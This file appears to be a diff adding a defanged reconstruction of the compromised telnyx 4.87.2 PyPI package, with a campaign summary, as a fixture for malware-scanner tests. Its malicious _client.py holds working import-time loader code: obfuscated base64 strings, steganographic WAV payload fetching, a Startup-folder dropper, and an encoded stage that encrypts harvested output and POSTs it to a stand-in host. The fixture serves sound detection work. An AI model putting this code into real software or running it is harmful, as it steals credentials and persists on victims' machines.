@@ -1,0 +1,347 @@
+# Defanged reconstruction of a real malicious package, for scanner tests.
+# Never extract and run. See internal/e2e/livescan/corpus.go.
+id: telnyx-4.87.2
+title: "telnyx 4.87.2 (PyPI): import-time loader takes its second stage out of the audio frames of a WAV file"
+campaign: teampcp-trivy-2026
+date: "2026-03-27"
+kind: wheel
+ecosystem: pip
+name: telnyx
+version: "4.87.2"
+benignVersion: "4.87.0"
+summary: >-
+  On 2026-03-27 the TeamPCP actor published telnyx 4.87.1 (03:51 UTC) and
+  4.87.2 (04:07 UTC per Endor Labs) to PyPI, the official Python SDK of the
+  Telnyx telephony platform, using a stolen publishing token: neither release
+  has a commit, tag or GitHub release, the project used no Trusted Publisher,
+  and how the token leaked is not established (Endor Labs suspects the litellm
+  compromise three days earlier). PyPI quarantined both by 10:13 UTC (Telnyx,
+  GHSA-955r-262c-33jc; Phoenix Security says about 07:00, reports differ). Only
+  telnyx/_client.py changed, and nothing runs at install time: importing
+  telnyx calls setup() (Windows) and FetchAudio() (Linux and macOS). 4.87.1
+  spelled the first call Setup(), a NameError that stopped it, so 4.87.2 is
+  the complete version. Each path downloads a "WAV" from a raw IP over plain
+  HTTP on port 8080 (ringtone.wav or hangup.wav, Mozilla/5.0 User-Agent), reads
+  its frames with the wave module, base64-decodes them and XORs everything
+  after the first 8 bytes with those 8 bytes. On Linux and macOS the result, a
+  332-line credential harvester, is piped to a fresh python process; its
+  output is AES-256-CBC encrypted, the key wrapped with the same RSA-4096 key
+  as in litellm, and POSTed as tpcp.tar.gz with an X-Filename header. Endor
+  Labs lists SSH keys, cloud and Kubernetes credentials, .env files and
+  secrets-manager contents as the loot, Socket calls it only a data harvester,
+  and reports differ on Linux persistence (Endor Labs and Phoenix Security: an
+  audiomon systemd user service; Socket: none). On Windows the decoded bytes
+  are a PE dropped as msbuild.exe in the Startup folder, with a hidden
+  msbuild.exe.lock allowing one download per 12 hours. Endor Labs found it by
+  diffing the wheels against the v4.87.0 tag and reported it in GitHub issue
+  #235.
+techniques: [stolen-publishing-token, import-time-execution, audio-steganography, base64-xor-decoding, fileless-execution, credential-theft, rsa-aes-exfiltration, startup-folder-persistence]
+reconstruction: >-
+  telnyx/_client.py follows the descriptions of Socket, SafeDep, StepSecurity,
+  Endor Labs and Phoenix Security: extra standard-library imports at the top
+  (os twice), a _d() base64 string helper, the _p blob between __all__ and the
+  class, setup() and FetchAudio() after the class, and the two bare calls at
+  the bottom in that order. setup() returns unless on Windows and passes
+  APPDATA, the Startup path, msbuild.exe and the URL through _d(); it keeps the
+  43200 second lock (attrib +h), the msbuild.exe.tmp staging file and
+  creationflags 0x08000000. FetchAudio() returns on Windows and otherwise
+  starts _p in a detached interpreter (start_new_session) with its output
+  discarded. The frame extraction is the one the analyses quote (readframes,
+  b64decode, an 8-byte key). _p is not the original 4,428-character blob but a
+  short stage written from the descriptions: it fetches ringtone.wav, decodes
+  it, pipes the result to "python -", then encrypts and POSTs what comes back,
+  with the truncated throwaway RSA key of the litellm sample. The harvester and
+  the PE were never in the wheel (they sit in the WAV on the C2) and are not
+  reproduced. The C2 is the documentation address 203.0.113.7:8080, a raw IP
+  over HTTP as in the original. 4.87.1's Setup() typo is not modelled, and as
+  in the real wheels only _client.py differs from 4.87.0 (_version.py still
+  says 4.87.0). The rest of the SDK is a tiny stand-in for the generated
+  client (the real _client.py has about 7,800 lines). The second indicator is
+  the base64 of "msbuild.exe", which the loader decodes at run time.
+references:
+  - https://telnyx.com/resources/telnyx-python-sdk-supply-chain-security-notice-march-2026
+  - https://osv.dev/vulnerability/GHSA-955r-262c-33jc
+  - https://socket.dev/blog/telnyx-python-sdk-compromised
+  - https://endorlabs.com/learn/teampcp-strikes-again-telnyx-compromised-three-days-after-litellm
+  - https://safedep.io/malicious-telnyx-pypi-compromise/
+  - https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package
+  - https://www.trendmicro.com/en/research/26/c/teampcp-telnyx-attack-marks-a-shift-in-tactics.html
+  - https://phoenix.security/teampcp-telnyx-pypi-supply-chain-wav-steganography-windows-persistence/
+legitimateHosts:
+  - api.telnyx.com
+indicators:
+  - FetchAudio
+  - "bXNidWlsZC5leGU="
+-- shared/telnyx/__init__.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+from ._version import __title__, __version__
+from ._client import Client, Telnyx
+from ._exceptions import TelnyxError, APIStatusError, APIConnectionError
+
+__all__ = [
+    "Client",
+    "Telnyx",
+    "TelnyxError",
+    "APIStatusError",
+    "APIConnectionError",
+    "__title__",
+    "__version__",
+]
+-- shared/telnyx/_version.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+__title__ = "telnyx"
+__version__ = "4.87.0"  # x-release-please-version
+-- shared/telnyx/_exceptions.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+from __future__ import annotations
+
+__all__ = ["TelnyxError", "APIConnectionError", "APIStatusError"]
+
+
+class TelnyxError(Exception):
+    pass
+
+
+class APIConnectionError(TelnyxError):
+    """Raised when the client cannot reach the API."""
+
+
+class APIStatusError(TelnyxError):
+    """Raised when the API answers with a 4xx or 5xx status."""
+
+    def __init__(self, message: str, *, status_code: int) -> None:
+        super().__init__(message)
+        self.status_code = status_code
+-- shared/telnyx/_base_client.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+from __future__ import annotations
+
+from typing import Any, Mapping
+
+import httpx
+
+from . import _exceptions
+
+DEFAULT_TIMEOUT = 60.0
+DEFAULT_MAX_RETRIES = 2
+
+
+class BaseClient:
+    def __init__(self, *, version: str, base_url: str | httpx.URL, timeout: float, max_retries: int) -> None:
+        self._version = version
+        self.base_url = str(base_url).rstrip("/")
+        self.timeout = timeout
+        self.max_retries = max_retries
+
+    @property
+    def default_headers(self) -> dict[str, str]:
+        return {"Accept": "application/json", "User-Agent": f"Telnyx/Python {self._version}"}
+
+
+class SyncAPIClient(BaseClient):
+    def post(self, path: str, *, body: Mapping[str, Any] | None = None) -> Any:
+        headers = {**self.default_headers, **self.auth_headers}
+        with httpx.Client(timeout=self.timeout) as http:
+            response = http.post(self.base_url + path, json=body, headers=headers)
+        if response.status_code >= 400:
+            raise _exceptions.APIStatusError(response.text, status_code=response.status_code)
+        return response.json()
+-- shared/telnyx/resources/__init__.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+from .messages import Messages
+
+__all__ = ["Messages"]
+-- shared/telnyx/resources/messages.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+from __future__ import annotations
+
+__all__ = ["Messages"]
+
+
+class Messages:
+    def __init__(self, client) -> None:
+        self._client = client
+
+    def send(self, *, to: str, text: str, from_: str | None = None) -> dict:
+        """Send an SMS or MMS message."""
+        body = {"to": to, "text": text}
+        if from_ is not None:
+            body["from"] = from_
+        return self._client.post("/messages", body=body)
+-- benign/telnyx/_client.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+from __future__ import annotations
+
+import os
+
+import httpx
+
+from . import resources, _exceptions
+from ._version import __version__
+from ._base_client import DEFAULT_MAX_RETRIES, DEFAULT_TIMEOUT, SyncAPIClient
+
+__all__ = ["Telnyx", "Client"]
+
+
+class Telnyx(SyncAPIClient):
+    messages: resources.Messages
+
+    # client options
+    api_key: str
+
+    def __init__(
+        self,
+        *,
+        api_key: str | None = None,
+        base_url: str | httpx.URL | None = None,
+        timeout: float = DEFAULT_TIMEOUT,
+        max_retries: int = DEFAULT_MAX_RETRIES,
+    ) -> None:
+        """Construct a new synchronous Telnyx client instance.
+
+        This automatically infers the `api_key` argument from the `TELNYX_API_KEY` environment variable if it is not provided.
+        """
+        if api_key is None:
+            api_key = os.environ.get("TELNYX_API_KEY")
+        if api_key is None:
+            raise _exceptions.TelnyxError(
+                "The api_key client option must be set either by passing api_key to the client or by setting the TELNYX_API_KEY environment variable"
+            )
+        self.api_key = api_key
+
+        if base_url is None:
+            base_url = os.environ.get("TELNYX_BASE_URL")
+        if base_url is None:
+            base_url = "https://api.telnyx.com/v2"
+
+        super().__init__(version=__version__, base_url=base_url, timeout=timeout, max_retries=max_retries)
+
+        self.messages = resources.Messages(self)
+
+    @property
+    def auth_headers(self) -> dict[str, str]:
+        return {"Authorization": f"Bearer {self.api_key}"}
+
+
+Client = Telnyx
+-- malicious/telnyx/_client.py --
+# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.
+
+from __future__ import annotations
+
+import os
+import sys
+import time
+import wave
+import base64
+import tempfile
+import subprocess
+import urllib.request
+
+import os
+
+import httpx
+
+from . import resources, _exceptions
+from ._version import __version__
+from ._base_client import DEFAULT_MAX_RETRIES, DEFAULT_TIMEOUT, SyncAPIClient
+
+
+def _d(s):
+    return base64.b64decode(s).decode("utf-8")
+
+
+__all__ = ["Telnyx", "Client"]
+
+_p = "aW1wb3J0IGJhc2U2NAppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgdGVtcGZpbGUKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB3YXZlCgpXQVZfVVJMID0gImh0dHA6Ly8yMDMuMC4xMTMuNzo4MDgwL3Jpbmd0b25lLndhdiIKUE9TVF9VUkwgPSAiaHR0cDovLzIwMy4wLjExMy43OjgwODAvIgpQVUJfUEVNID0gIiIiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQ0lqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FnOEFNSUlDQ2dLQ0FnRUFsakovaHdVUUxPdmtMdW1HZUtINgplVklJY3lDdUVkWFBBM3hVeXg5Y2taTFhjTXNvN3lKS3hSWEdRVzliZnF5YTVZNVJBY1llcUhvUW9ZekhHb3o4CkcwenhyM2xKdGV2b3NtejdqcllQOEw4Q0F3RUFBUT09Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQoiIiIKCgpkZWYgYXVkaW9pbXBvcnQoKToKICAgIGlmIG9zLm5hbWUgPT0gIm50IjoKICAgICAgICByZXR1cm4KICAgIHdpdGggdGVtcGZpbGUuVGVtcG9yYXJ5RGlyZWN0b3J5KCkgYXMgd29yazoKICAgICAgICB3YXYgPSBvcy5wYXRoLmpvaW4od29yaywgImEud2F2IikKICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KFdBVl9VUkwsIGhlYWRlcnM9eyJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIn0pCiAgICAgICAgd2l0aCBvcGVuKHdhdiwgIndiIikgYXMgZmg6CiAgICAgICAgICAgIGZoLndyaXRlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PTMwKS5yZWFkKCkpCiAgICAgICAgd2l0aCB3YXZlLm9wZW4od2F2LCAicmIiKSBhcyB3OgogICAgICAgICAgICByYXcgPSBiYXNlNjQuYjY0ZGVjb2RlKHcucmVhZGZyYW1lcyh3LmdldG5mcmFtZXMoKSkpCiAgICAgICAga2V5LCBlbmMgPSByYXdbOjhdLCByYXdbODpdCiAgICAgICAgc3RhZ2UgPSBieXRlcyhiIF4ga2V5W2kgJSBsZW4oa2V5KV0gZm9yIGksIGIgaW4gZW51bWVyYXRlKGVuYykpCiAgICAgICAgZGF0YSA9IG9zLnBhdGguam9pbih3b3JrLCAiYyIpCiAgICAgICAgd2l0aCBvcGVuKGRhdGEsICJ3YiIpIGFzIG91dDoKICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oW3N5cy5leGVjdXRhYmxlLCAiLSJdLCBpbnB1dD1zdGFnZSwgc3Rkb3V0PW91dCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBpZiBub3Qgb3MucGF0aC5nZXRzaXplKGRhdGEpOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBzaywgcHViID0gb3MucGF0aC5qb2luKHdvcmssICJzZXNzaW9uLmtleSIpLCBvcy5wYXRoLmpvaW4od29yaywgInB1Yi5wZW0iKQogICAgICAgIGVuY19kYXRhLCBlbmNfa2V5ID0gb3MucGF0aC5qb2luKHdvcmssICJwYXlsb2FkLmVuYyIpLCBvcy5wYXRoLmpvaW4od29yaywgInNlc3Npb24ua2V5LmVuYyIpCiAgICAgICAgd2l0aCBvcGVuKHB1YiwgInciKSBhcyBmaDoKICAgICAgICAgICAgZmgud3JpdGUoUFVCX1BFTSkKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm9wZW5zc2wiLCAicmFuZCIsICItb3V0Iiwgc2ssICIzMiJdLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIHN1YnByb2Nlc3MucnVuKFsib3BlbnNzbCIsICJlbmMiLCAiLWFlcy0yNTYtY2JjIiwgIi1wYmtkZjIiLCAiLWluIiwgZGF0YSwgIi1vdXQiLCBlbmNfZGF0YSwgIi1wYXNzIiwgImZpbGU6IiArIHNrXSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm9wZW5zc2wiLCAicGtleXV0bCIsICItZW5jcnlwdCIsICItcHViaW4iLCAiLWlua2V5IiwgcHViLCAiLXBrZXlvcHQiLCAicnNhX3BhZGRpbmdfbW9kZTpvYWVwIiwgIi1pbiIsIHNrLCAiLW91dCIsIGVuY19rZXldLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIGJ1bmRsZSA9IG9zLnBhdGguam9pbih3b3JrLCAidHBjcC50YXIuZ3oiKQogICAgICAgIHN1YnByb2Nlc3MucnVuKFsidGFyIiwgIi1jemYiLCBidW5kbGUsICItQyIsIHdvcmssICJwYXlsb2FkLmVuYyIsICJzZXNzaW9uLmtleS5lbmMiXSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbImN1cmwiLCAiLXMiLCAiLW8iLCAiL2Rldi9udWxsIiwgIi1YIiwgIlBPU1QiLCAiLUgiLCAiWC1GaWxlbmFtZTogdHBjcC50YXIuZ3oiLCAiLS1kYXRhLWJpbmFyeSIsICJAIiArIGJ1bmRsZSwgUE9TVF9VUkxdLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQoKCmF1ZGlvaW1wb3J0KCkK"
+
+
+class Telnyx(SyncAPIClient):
+    messages: resources.Messages
+
+    # client options
+    api_key: str
+
+    def __init__(
+        self,
+        *,
+        api_key: str | None = None,
+        base_url: str | httpx.URL | None = None,
+        timeout: float = DEFAULT_TIMEOUT,
+        max_retries: int = DEFAULT_MAX_RETRIES,
+    ) -> None:
+        """Construct a new synchronous Telnyx client instance.
+
+        This automatically infers the `api_key` argument from the `TELNYX_API_KEY` environment variable if it is not provided.
+        """
+        if api_key is None:
+            api_key = os.environ.get("TELNYX_API_KEY")
+        if api_key is None:
+            raise _exceptions.TelnyxError(
+                "The api_key client option must be set either by passing api_key to the client or by setting the TELNYX_API_KEY environment variable"
+            )
+        self.api_key = api_key
+
+        if base_url is None:
+            base_url = os.environ.get("TELNYX_BASE_URL")
+        if base_url is None:
+            base_url = "https://api.telnyx.com/v2"
+
+        super().__init__(version=__version__, base_url=base_url, timeout=timeout, max_retries=max_retries)
+
+        self.messages = resources.Messages(self)
+
+    @property
+    def auth_headers(self) -> dict[str, str]:
+        return {"Authorization": f"Bearer {self.api_key}"}
+
+
+Client = Telnyx
+
+
+def setup():
+    if os.name != "nt":
+        return
+    d = os.path.join(os.getenv(_d("QVBQREFUQQ==")), _d("TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw"))
+    exe = os.path.join(d, _d("bXNidWlsZC5leGU="))
+    lock = exe + ".lock"
+    try:
+        if os.path.exists(lock) and time.time() - os.path.getmtime(lock) < 43200:
+            return
+        req = urllib.request.Request(_d("aHR0cDovLzIwMy4wLjExMy43OjgwODAvaGFuZ3VwLndhdg=="), headers={"User-Agent": "Mozilla/5.0"})
+        tmp = exe + ".tmp"
+        with open(tmp, "wb") as fh:
+            fh.write(urllib.request.urlopen(req, timeout=30).read())
+        with wave.open(tmp, "rb") as w:
+            raw = base64.b64decode(w.readframes(w.getnframes()))
+        key, enc = raw[:8], raw[8:]
+        with open(tmp, "wb") as fh:
+            fh.write(bytes(b ^ key[i % len(key)] for i, b in enumerate(enc)))
+        os.replace(tmp, exe)
+        open(lock, "w").close()
+        subprocess.run(["attrib", "+h", lock], capture_output=True)
+        subprocess.Popen([exe], creationflags=0x08000000)
+    except Exception:
+        pass
+
+
+def FetchAudio():
+    if os.name == "nt":
+        return
+    subprocess.Popen(
+        [sys.executable, "-c", "import base64;exec(base64.b64decode('" + _p + "').decode())"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        start_new_session=True,
+    )
+
+
+setup()
+FetchAudio()
